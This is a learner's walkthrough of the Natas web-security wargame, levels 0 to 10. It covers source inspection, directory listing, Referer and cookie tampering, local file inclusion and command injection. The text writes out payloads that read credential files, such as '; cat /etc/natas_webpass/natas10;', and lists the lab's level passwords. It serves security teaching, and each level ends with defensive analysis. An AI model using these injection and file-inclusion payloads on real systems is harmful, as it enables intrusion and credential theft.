# Natas
## Introduction 
The OverTheWire Natas wargame focuses on introducing the fundamentals of server-side web security. It is designed to help learners understand common web vulnerabilities and how they can be exploited through practical, hands-on challenges.

## Structure and Access
Each level in Natas is presented as a standalone web application, accessible via a unique URL following the format:
http://natasX.natas.labs.overthewire.org, where X represents the level number.
Unlike other wargames, Natas does not require SSH access. Instead, users log in through the web interface using the designated username (e.g., natas0 for Level 0) along with the corresponding password.

## Objective
The main objective of each level is to retrieve the password for the next level. This typically involves analyzing the web application, identifying vulnerabilities, and exploiting them to gain access to restricted information.
- Passwords for each level are stored on the server in the directory: `/etc/natas_webpass/`
- For example, the password for natas5 is stored in: `/etc/natas_webpass/natas5`, and can only be accessed by specific permission levels (e.g., natas4 and natas5). This reinforces the concept of access control and privilege separation.

## Getting Started
To begin the challenge:
- Username: natas0
- Password: natas0
- URL: http://natas0.natas.labs.overthewire.org

Learners are encouraged to explore each level carefully, inspect web elements, and apply logical thinking to uncover hidden information. Each challenge builds upon previous knowledge, gradually strengthening understanding of web security concepts.

---

## Natas 0
```
URL: http://natas0.natas.labs.overthewire.org
Username: natas0
Password: natas0
```
After login, the following note is displayed: 
```
You can find the password for the next level on this page.
```

### Approach
After logging into the web application, the page does not visibly display any useful information.  
To investigate further, the page source code was examined using:
- Right-click → **View Page Source**, or  
- Browser Developer Tools (**Inspect**)

```html
<html>
<head>
<!-- This stuff in the header has nothing to do with the level -->
<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
<script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
<script>var wechallinfo = { "level": "natas0", "pass": "natas0" };</script></head>
<body>
<h1>natas0</h1>
<div id="content">
You can find the password for the next level on this page.

<!--The password for natas1 is 0nzCigAq7t2iALyvU9xcHlYN4MlkIwlq -->
</div>
</body>
</html>
```

### Finding 
In the `<div></div>` content, the password is discovered, which is `<!--The password for natas1 is 0nzCigAq7t2iALyvU9xcHlYN4MlkIwlq -->`

### Analysis
This level demonstrates a basic information disclosure vulnerability, where sensitive data is exposed within the client-side source code.
Although comments are not rendered in the browser, they are still accessible to users who inspect the page. Storing credentials in HTML comments is considered a poor security practice, as it allows attackers to easily retrieve hidden information.

Thus, it is important to note that HTML comments are not secure and should not be used to hide critical data. Always inspect page source when analyzing web applications and never store sensitive information (e.g., passwords) in client-side code.


---

## Natas 1
```
URL: http://natas1.natas.labs.overthewire.org
Username: natas1
Password: 0nzCigAq7t2iALyvU9xcHlYN4MlkIwlq
```
After login, the following note is displayed: 
```
You can find the password for the next level on this page, but rightclicking has been blocked!
```

### Approach 
Upon accessing the webpage, it was observed that right-click functionality was disabled, preventing the use of standard options such as **“View Page Source”** or **“Inspect”**.
To bypass this restriction, alternative methods were used:
- Press **F12** to open Developer Tools  
- Press **CTRL + U** to directly view the page source  
These shortcuts are browser-level features and cannot be disabled by client-side scripts.

```html
<html>
<head>
<!-- This stuff in the header has nothing to do with the level -->
<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
<script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
<script>var wechallinfo = { "level": "natas1", "pass": "0nzCigAq7t2iALyvU9xcHlYN4MlkIwlq" };</script></head>
<body oncontextmenu="javascript:alert('right clicking has been blocked!');return false;">
<h1>natas1</h1>
<div id="content">
You can find the password for the
next level on this page, but rightclicking has been blocked!

<!--The password for natas2 is TguMNxKo1DSa1tujBLuZJnDUlCcUAPlI -->
</div>
</body>
</html>
```

### Finding 
After viewing the page source, a similar pattern to the previous level was identified. The password for the next level was found embedded within an HTML comment inside the `<div>` element, which is `<!--The password for natas2 is TguMNxKo1DSa1tujBLuZJnDUlCcUAPlI -->`

### Analysis
This level demonstrates that client-side restrictions, such as disabling right-click, do not provide real security. Such controls can be easily bypassed using built-in browser shortcuts or developer tools. Additionally, the application continues to expose sensitive information through HTML comments, reinforcing the concept of **information disclosure vulnerabilities** in client-side code. It is important to understand that restricting user interactions via JavaScript does not prevent access to underlying source code. Sensitive data should never be stored on the client side, regardless of any interface restrictions imposed.

---

## Natas 2
```
URL: http://natas2.natas.labs.overthewire.org
Username: natas2
Password: TguMNxKo1DSa1tujBLuZJnDUlCcUAPlI
```
After login, the following note `There is nothing on this page` is displayed.

### Approach 
The page did not display any obvious information related to the next level.  
To investigate further, the page source was accessed using: **CTRL + U**

Below is the content of the page source: 
```html
<html>
<head>
<!-- This stuff in the header has nothing to do with the level -->
<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
<script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
<script>var wechallinfo = { "level": "natas2", "pass": "TguMNxKo1DSa1tujBLuZJnDUlCcUAPlI" };</script></head>
<body>
<h1>natas2</h1>
<div id="content">
There is nothing on this page
<img src="files/pixel.png">
</div>
</body></html>
```

Within the source code, the line `<img src="files/pixel.png">` was identified. This indicated the existence of a directory named `/files/`. 

By navigating to: `http://natas2.natas.labs.overthewire.org/files/`, a directory listing was revealed.

### Finding 
The `/files/` directory contains `pixel.png` and `users.txt`

Upon accessing users.txt, the following credentials were found:
```txt
# username:password
alice:BYNdCesZqW
bob:jw2ueICLvT
charlie:G5vCxkVV3m
natas3:3gqisGdR0pjm6tpkDKdIWO2hSvchLeYH
eve:zo4mJWyNj2
mallory:9urtcpzBmH
```
The password for natas3 was successfully obtained.

### Analysis
This level demonstrates a common directory listing vulnerability, where sensitive files are exposed due to improper server configuration. The presence of the `/files/` directory, combined with directory indexing enabled, allowed unauthorized users to browse and access internal files. The `users.txt` file contained plaintext credentials, leading directly to the next level.

This highlights the importance of securing server directories by disabling directory listing and restricting access to sensitive files. Additionally, storing credentials in plaintext within accessible directories is a critical security flaw that should always be avoided.


---

## Natas 3
```
URL: http://natas3.natas.labs.overthewire.org
Username: natas3
Password: 3gqisGdR0pjm6tpkDKdIWO2hSvchLeYH
```
After login, the following note `There is nothing on this page` is displayed.

### Approach 
Below is the initial inspection of the webpage and its source code (**CTRL + U**): 
```html
<html>
<head>
<!-- This stuff in the header has nothing to do with the level -->
<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
<script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
<script>var wechallinfo = { "level": "natas3", "pass": "3gqisGdR0pjm6tpkDKdIWO2hSvchLeYH" };</script></head>
<body>
<h1>natas3</h1>
<div id="content">
There is nothing on this page
<!-- No more information leaks!! Not even Google will find it this time... -->
</div>
</body></html>
```
but did not reveal any useful information.

As an alternative approach, common hidden paths were explored. The file `robots.txt` was accessed via `http://natas3.natas.labs.overthewire.org/robots.txt`. This file is typically used to instruct search engines on which directories should not be indexed.

### Finding 
The `robots.txt` file contained the following entry:
```txt
User-agent: *
Disallow: /s3cr3t/
```

This revealed a hidden directory: `/s3cr3t/`. Navigating to the directory: `http://natas3.natas.labs.overthewire.org/s3cr3t/`. A file named `users.txt` was discovered. Accessing it revealed:
```txt
natas4:QryZXc2e0zahULdHrtHxzyYkj59kUxLQ
```
The password for **natas4** was successfully obtained.

### Analysis
This level demonstrates improper handling of sensitive directories through the use of `robots.txt`. While this file is intended to guide search engine crawlers, it does not enforce access restrictions and is publicly accessible to anyone.

By listing `/s3cr3t/` in `robots.txt`, the application unintentionally exposed the location of a sensitive directory. Since no additional access controls were implemented, it was possible to directly navigate to the directory and retrieve confidential information.

This highlights that `robots.txt` should not be relied upon as a security mechanism. Sensitive resources must be properly secured using authentication and authorization controls, rather than simply being hidden from search engines.


---

## Natas 4
```
URL: http://natas4.natas.labs.overthewire.org
Username: natas4
Password: QryZXc2e0zahULdHrtHxzyYkj59kUxLQ
```
After login, the following note is displayed: `Access disallowed. You are visiting from "" while authorized users should come only from "http://natas5.natas.labs.overthewire.org/"`

After clicking `Refresh page`, we are navigating to `http://natas4.natas.labs.overthewire.org/index.php` and the following note is displayed: `Access disallowed. You are visiting from "http://natas4.natas.labs.overthewire.org/" while authorized users should come only from "http://natas5.natas.labs.overthewire.org/"`

After clicking the `Refresh page` again, we are navigating to the same page `http://natas4.natas.labs.overthewire.org/index.php`, and the following note is displayed: `Access disallowed. You are visiting from "http://natas4.natas.labs.overthewire.org/index.php" while authorized users should come only from "http://natas5.natas.labs.overthewire.org/"`

### Approach 
This suggests that the server is validating the **HTTP Referer header** to control access. To bypass this restriction, configure the proxy setting and turn on the intercept of the burpsuite. Then, the content below is captured through HTTP history: 
```
GET /index.php HTTP/1.1
Host: natas4.natas.labs.overthewire.org
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Authorization: Basic bmF0YXM0OlFyeVpYYzJlMHphaFVMZEhydEh4enlZa2o1OWtVeExR
Connection: keep-alive
Referer: http://natas4.natas.labs.overthewire.org/index.php
Cookie: _ga_RD0K2239G0=GS2.1.s1775744396$o2$g0$t1775744396$j60$l0$h0; _ga=GA1.1.1340419348.1775651007
Upgrade-Insecure-Requests: 1
```

Next, send the captured request to repeater and modify the referer from `Referer: http://natas4.natas.labs.overthewire.org/index.php` to `Referer: http://natas5.natas.labs.overthewire.org/`. Then send the request. 

### Finding 
After that, you will obtain the response below: 
```html
HTTP/1.1 200 OK
Date: Sat, 11 Apr 2026 14:36:22 GMT
Server: Apache/2.4.58 (Ubuntu)
Vary: Accept-Encoding
Content-Length: 962
Keep-Alive: timeout=5, max=100
Connection: Keep-Alive
Content-Type: text/html; charset=UTF-8

<html>
<head>
<!-- This stuff in the header has nothing to do with the level -->
<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
<script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
<script>var wechallinfo = { "level": "natas4", "pass": "QryZXc2e0zahULdHrtHxzyYkj59kUxLQ" };</script></head>
<body>
<h1>natas4</h1>
<div id="content">

Access granted. The password for natas5 is 0n35PkggAPm2zbEpOU802c0x0Msn1ToK
<br/>
<div id="viewsource"><a href="index.php">Refresh page</a></div>
</div>
</body>
</html>
```
Then, the password for natas5 is successfully obtained.

### Analysis
This level demonstrates a Referer header-based access control vulnerability. The application relies on the client-supplied Referer header to determine whether a request is authorized.

Since HTTP headers can be easily modified by an attacker using tools like Burp Suite, this form of access control is inherently insecure. The server does not perform proper validation or authentication, allowing attackers to spoof the expected request origin.

This highlights that client-controlled data, such as HTTP headers, should never be trusted for enforcing security mechanisms. Proper access control should be implemented server-side using robust authentication and authorization techniques.

---


## Natas 5
```
URL: http://natas5.natas.labs.overthewire.org
Username: natas5
Password: 0n35PkggAPm2zbEpOU802c0x0Msn1ToK
```
After login, the following note is displayed: `Access disallowed. You are not logged in`

### Approach 
To do the investigation, the burpsuite is used and the intercept is turned on. Then, refresh the page again and get the request and forward it. Then, request and response below is collected from http history. 

#### Content of the request: 
```html
GET / HTTP/1.1
Host: natas5.natas.labs.overthewire.org
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Authorization: Basic bmF0YXM1OjBuMzVQa2dnQVBtMnpiRXBPVTgwMmMweDBNc24xVG9L
Connection: keep-alive
Cookie: _ga_RD0K2239G0=GS2.1.s1775744396$o2$g0$t1775744396$j60$l0$h0; _ga=GA1.1.1340419348.1775651007; loggedin=0
Upgrade-Insecure-Requests: 1
```

#### Content of the response
```html
HTTP/1.1 200 OK
Date: Sat, 11 Apr 2026 14:57:37 GMT
Server: Apache/2.4.58 (Ubuntu)
Set-Cookie: loggedin=0
Vary: Accept-Encoding
Content-Length: 855
Keep-Alive: timeout=5, max=100
Connection: Keep-Alive
Content-Type: text/html; charset=UTF-8

<html>
<head>
<!-- This stuff in the header has nothing to do with the level -->
<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
<script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
<script>var wechallinfo = { "level": "natas5", "pass": "0n35PkggAPm2zbEpOU802c0x0Msn1ToK" };</script></head>
<body>
<h1>natas5</h1>
<div id="content">
Access disallowed. You are not logged in</div>
</body>
</html>
```

Through observation, it was identified that the application uses a cookie parameter (`loggedin`) to manage authentication state.

Next, the request is sent to the repeater and the loggedin parameter in cookie is modified from 
```
Cookie: _ga_RD0K2239G0=GS2.1.s1775744396$o2$g0$t1775744396$j60$l0$h0; _ga=GA1.1.1340419348.1775651007; loggedin=0
```
to 
```
Cookie: _ga_RD0K2239G0=GS2.1.s1775744396$o2$g0$t1775744396$j60$l0$h0; _ga=GA1.1.1340419348.1775651007; loggedin=1
```
The modified request was then resent to the server.


### Finding 
After sending the request, the following response is returned: 
```html
HTTP/1.1 200 OK
Date: Sat, 11 Apr 2026 15:03:55 GMT
Server: Apache/2.4.58 (Ubuntu)
Set-Cookie: loggedin=1
Vary: Accept-Encoding
Content-Length: 890
Keep-Alive: timeout=5, max=100
Connection: Keep-Alive
Content-Type: text/html; charset=UTF-8

<html>
<head>
<!-- This stuff in the header has nothing to do with the level -->
<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
<script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
<script>var wechallinfo = { "level": "natas5", "pass": "0n35PkggAPm2zbEpOU802c0x0Msn1ToK" };</script></head>
<body>
<h1>natas5</h1>
<div id="content">
Access granted. The password for natas6 is 0RoJwHdSKWFTYR5WuiAewauSuNaBXned</div>
</body>
</html>
```

### Analysis
This level demonstrates a cookie-based authentication vulnerability, where the application relies on client-side data to determine whether a user is authenticated.

Since cookies are stored and controlled by the client, they can be easily modified using tools like Burp Suite. By simply changing the loggedin value from 0 to 1, it was possible to bypass authentication without valid credentials.

This highlights a critical security flaw: client-side data should never be trusted for authentication or authorization decisions. Proper session management must be enforced on the server side, where session states are securely validated and cannot be manipulated by the user.


---


## Natas 6
```
URL: http://natas6.natas.labs.overthewire.org
Username: natas6
Password: 0RoJwHdSKWFTYR5WuiAewauSuNaBXned
```
After logging in, the webpage displayed an input field labeled **“Input secret”**, along with a submit button. Initial testing with arbitrary values such as `aaa` and `bbb` returned the response: `Wrong secret`.

Additionally, a **View Sourcecode** link was available for further inspection. Below is the content of the source code: 
```html
<html>
<head>
<!-- This stuff in the header has nothing to do with the level -->
<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
<script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
<script>var wechallinfo = { "level": "natas6", "pass": "<censored>" };</script></head>
<body>
<h1>natas6</h1>
<div id="content">

<?

include "includes/secret.inc";

    if(array_key_exists("submit", $_POST)) {
        if($secret == $_POST['secret']) {
        print "Access granted. The password for natas7 is <censored>";
    } else {
        print "Wrong secret";
    }
    }
?>

<form method=post>
Input secret: <input name=secret><br>
<input type=submit name=submit>
</form>

<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
</div>
</body>
</html>
```

### Finding
By reviewing the source code, it was observed that the server-side PHP implementation includes "includes/secret.inc“.

### Approach 
Further investigation was performed by navigating to ·http://natas6.natas.labs.overthewire.org/includes/secret.inc·, where the following content was obtained.
```
<?
$secret = "FOEIUWGHFEEUHOFUOIU";
?>
```

The value `FOEIUWGHFEEUHOFUOIU` was then tested as the input secret and submitted. The following response was returned:
```
Access granted. The password for natas7 is bmg8SvU1LizuWjx3y7xkNERkHxGre0GS
```

### Analysis
This level demonstrates a **poor server-side security practice**, where sensitive information is stored in an accessible file within the web directory structure.

Although the secret value is not directly shown in the main application, it can still be retrieved by directly accessing the included file due to improper access control. This exposes a **path disclosure and information leakage vulnerability**.

Sensitive data such as secrets, credentials, or configuration values should never be stored in publicly accessible web directories. Additionally, server-side files should be properly protected to prevent direct access.


---


## Natas 7
```
URL: http://natas7.natas.labs.overthewire.org
Username: natas7
Password: bmg8SvU1LizuWjx3y7xkNERkHxGre0GS
```
After login, two navigation links were observed: `Home` and `About`.
After clicked the `Home`, the page navigate to `http://natas7.natas.labs.overthewire.org/index.php?page=home` and displaying `this is the front page`.
After clicked the `About`, the page navigate to `http://natas7.natas.labs.overthewire.org/index.php?page=about` and displaying `this is the about page`. 

This indicates that the application dynamically loads content based on the `page` parameter in the URL.

### Finding 
Upon inspecting the page source, the following content is discovered:
```html
<html>
<head>
<!-- This stuff in the header has nothing to do with the level -->
<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
<script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
<script>var wechallinfo = { "level": "natas7", "pass": "bmg8SvU1LizuWjx3y7xkNERkHxGre0GS" };</script></head>
<body>
<h1>natas7</h1>
<div id="content">

<a href="index.php?page=home">Home</a>
<a href="index.php?page=about">About</a>
<br>
<br>
this is the about page

<!-- hint: password for webuser natas8 is in /etc/natas_webpass/natas8 -->
</div>
</body>
</html>
```

The comment `<!-- hint: password for webuser natas8 is in /etc/natas_webpass/natas8 -->` suggests that the application may allow access to local files. 


### Approach
Initial attempt to navigate to `http://natas7.natas.labs.overthewire.org/index.php?page=etc/natas_webpass/natas8` is made and following content is returned: 
```
Warning: include(etc/natas_webpass/natas8): failed to open stream: No such file or directory in /var/www/natas/natas7/index.php on line 21

Warning: include(): Failed opening 'etc/natas_webpass/natas8' for inclusion (include_path='.:/usr/share/php') in /var/www/natas/natas7/index.php on line 21
```
This resulted in an error, indicating the file could not be found.  

A second attempt using an absolute path `http://natas7.natas.labs.overthewire.org/index.php?page=/etc/natas_webpass/natas8`successfully returned the password: `xcoXLmzMkoIP9D7hlgPlh9XD7OgLAe5Q`.


### Analysis
This level demonstrates a **Local File Inclusion (LFI) vulnerability**, where user input is directly used to include files on the server without proper validation.

By manipulating the `page` parameter, it was possible to access sensitive files outside the intended directory. The application failed to sanitize or restrict input paths, allowing traversal to critical system files such as `/etc/natas_webpass/natas8`.

This highlights the importance of validating and restricting user input in file inclusion mechanisms. Applications should enforce strict whitelisting of allowed files and avoid directly including user-controlled input to prevent unauthorized access to sensitive data.


---


## Natas 8
```
URL: http://natas8.natas.labs.overthewire.org
Username: natas8
Password: xcoXLmzMkoIP9D7hlgPlh9XD7OgLAe5Q
```
After login, the webpage displayed an input field labeled **“Input secret”**, along with a submit button. Initial testing with arbitrary values such as `aaa` and `bbb` returned the response: `Wrong secret`.

Additionally, a **View Sourcecode** link was available for further inspection. Below is the content of the source code: 
```html
<html>
<head>
<!-- This stuff in the header has nothing to do with the level -->
<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
<script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
<script>var wechallinfo = { "level": "natas8", "pass": "<censored>" };</script></head>
<body>
<h1>natas8</h1>
<div id="content">

<?

$encodedSecret = "3d3d516343746d4d6d6c315669563362";

function encodeSecret($secret) {
    return bin2hex(strrev(base64_encode($secret)));
}

if(array_key_exists("submit", $_POST)) {
    if(encodeSecret($_POST['secret']) == $encodedSecret) {
    print "Access granted. The password for natas9 is <censored>";
    } else {
    print "Wrong secret";
    }
}
?>

<form method=post>
Input secret: <input name=secret><br>
<input type=submit name=submit>
</form>

<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
</div>
</body>
</html>
```

### Finding 
The source code revealed the following implementation:
```php
$encodedSecret = "3d3d516343746d4d6d6c315669563362";

function encodeSecret($secret) {
    return bin2hex(strrev(base64_encode($secret)));
}
```

This indicates that the input is transformed using the following sequence:
1. Base64 encoding  
2. String reversal  
3. Conversion to hexadecimal  


### Approach 
To discover the original input, the cyberchef (https://gchq.github.io/CyberChef/) is used. 
The recipe will be reverse step of the encryption, perform the following operation: 
1. Encrypted Answer as Input: `3d3d516343746d4d6d6c315669563362`
2. From Hex: `==QcCtmMml1ViV3b`
3. Reverse: `b3ViV1lmMmtCcQ==`
4. From Base64: `oubWYf2kBq` and obtain the answer. 

Then, input the answer `oubWYf2kBq` into the input field and submit. Then the the message `Access granted. The password for natas9 is ZE1ck82lmdGIoErlhQgWND6j2Wzz6b6t` is returned. 


### Analysis
This level demonstrates a **weak encoding-based security mechanism**, where sensitive validation relies on reversible transformations rather than secure hashing.

Since the encoding process (Base64, reverse, hex) is fully reversible, an attacker can easily derive the original secret by applying the inverse operations. Tools like CyberChef simplify this process, making such protections ineffective.

This highlights that encoding should not be used as a security control. Sensitive values should instead be protected using strong, one-way hashing algorithms and proper server-side validation mechanisms.


---


## Natas 9
```
URL: http://natas9.natas.labs.overthewire.org
Username: natas9
Password: ZE1ck82lmdGIoErlhQgWND6j2Wzz6b6t
```
After login, the webpage displayed an input field labeled **“Find words containing:”**, along with a search button. Initial testing with sample value such as `aa`: 
```
Output:
aardvark
aardvark's
bazaar
bazaar's
bazaars
```
returned matching results from a dictionary file, indicating that the application performs a search operation.

Additionally, a **View Sourcecode** link was available for further inspection. Below is the content of the source code: 
```html
<html>
<head>
<!-- This stuff in the header has nothing to do with the level -->
<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
<script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
<script>var wechallinfo = { "level": "natas9", "pass": "<censored>" };</script></head>
<body>
<h1>natas9</h1>
<div id="content">
<form>
Find words containing: <input name=needle><input type=submit name=submit value=Search><br><br>
</form>


Output:
<pre>
<?
$key = "";

if(array_key_exists("needle", $_REQUEST)) {
    $key = $_REQUEST["needle"];
}

if($key != "") {
    passthru("grep -i $key dictionary.txt");
}
?>
</pre>

<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
</div>
</body>
</html>
```


### Finding  
The source code revealed the following implementation:
```php
if($key != "") {
    passthru("grep -i $key dictionary.txt");
}
```
This shows that user input ($key) is directly passed into a system command without any sanitization.


### Approach 
By supplying the payload: `; cat /etc/natas_webpass/natas10;`, the executed command become 
`grep -i ; cat /etc/natas_webpass/natas10; dictionary.txt`. After clicking the submit button, the message `t7I5VHvpa14sJTUGV0cbEsbYfFP2dmOu` is returned. 

### Analysis
This level demonstrates a command injection vulnerability, where user input is directly executed as part of a system command.

The original command:
```bash
grep -i <input> dictionary.txt
```
is intended to search for matching words. However, since the input is not sanitized, it is possible to inject additional commands using shell metacharacters such as ;.

In this case:
- `;` = **command separator**. It tells the shell: “run another command” and is used to terminate the original command
- cat /etc/natas_webpass/natas10 is injected to read a sensitive file
- The final ; ensures proper command separation

As result, this becomes **3 commands**:
1. `grep -i`  
   → incomplete, does nothing useful

2. `cat /etc/natas_webpass/natas10`  
   → THIS is the important one (reads password file)

3. `dictionary.txt`  
   → treated as a command (ignored / error)

As a result, the system executes multiple commands instead of just the intended grep operation. This highlights the importance of properly sanitizing user input and avoiding direct execution of user-controlled data in system commands. Secure alternatives include input validation, escaping special characters, or using safer APIs that do not invoke the shell.


---


## Natas 10
```
URL: http://natas10.natas.labs.overthewire.org
Username: natas10
Password: t7I5VHvpa14sJTUGV0cbEsbYfFP2dmOu
```
After login, the webpage displayed a message `For security reasons, we now filter on certain characters` and an input field labeled **“Find words containing:”**, along with a search button. Initial testing with sample value such as `aa`: 
```
Output:
aardvark
aardvark's
bazaar
bazaar's
bazaars
```
returned matching results from a dictionary file, indicating that the application performs a search operation.

Additionally, a **View Sourcecode** link was available for further inspection. Below is the content of the source code: 
```html
<html>
<head>
<!-- This stuff in the header has nothing to do with the level -->
<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
<script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
<script>var wechallinfo = { "level": "natas10", "pass": "<censored>" };</script></head>
<body>
<h1>natas10</h1>
<div id="content">

For security reasons, we now filter on certain characters<br/><br/>
<form>
Find words containing: <input name=needle><input type=submit name=submit value=Search><br><br>
</form>


Output:
<pre>
<?
$key = "";

if(array_key_exists("needle", $_REQUEST)) {
    $key = $_REQUEST["needle"];
}

if($key != "") {
    if(preg_match('/[;|&]/',$key)) {
        print "Input contains an illegal character!";
    } else {
        passthru("grep -i $key dictionary.txt");
    }
}
?>
</pre>

<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
</div>
</body>
</html>
```


### Finding 
The source code revealed the following logic:
```php
if(preg_match('/[;|&]/',$key)) {
    print "Input contains an illegal character!";
} else {
    passthru("grep -i $key dictionary.txt");
}
```
This shows that the application attempts to prevent command injection by filtering the characters:`;`, `|` and `&`. However, user input is still directly passed into the system command.


### Approach 
By supplying the payload `a /etc/natas_webpass/natas11` as the input and click the submit button. The following content is returned: 
```
/etc/natas_webpass/natas11:UJdqkK1pTu6VLt9UHWAgRZz6sVUZ3lEk
dictionary.txt:African
dictionary.txt:Africans
dictionary.txt:Allah
dictionary.txt:Allah's
dictionary.txt:American
dictionary.txt:Americanism
dictionary.txt:Americanism's
dictionary.txt:Americanisms
dictionary.txt:Americans
dictionary.txt:April
dictionary.txt:April's
dictionary.txt:Aprils
dictionary.txt:Asian
dictionary.txt:Asians
dictionary.txt:August
dictionary.txt:August's
dictionary.txt:Augusts
dictionary.txt:Catholic
dictionary.txt:Catholicism
dictionary.txt:Catholicism's
dictionary.txt:Catholicisms
dictionary.txt:Catholics
(and many other words that contain letter 'a' inside the dictionary.txt)
```

As the payload `a /etc/natas_webpass/natas11` is used, the executed command becomes: 
```
grep -i a /etc/natas_webpass/natas11 dictionary.txt
```
which returns the words that have letter `a` in both /etc/natas_webpass/natas11 and dictionary.txt


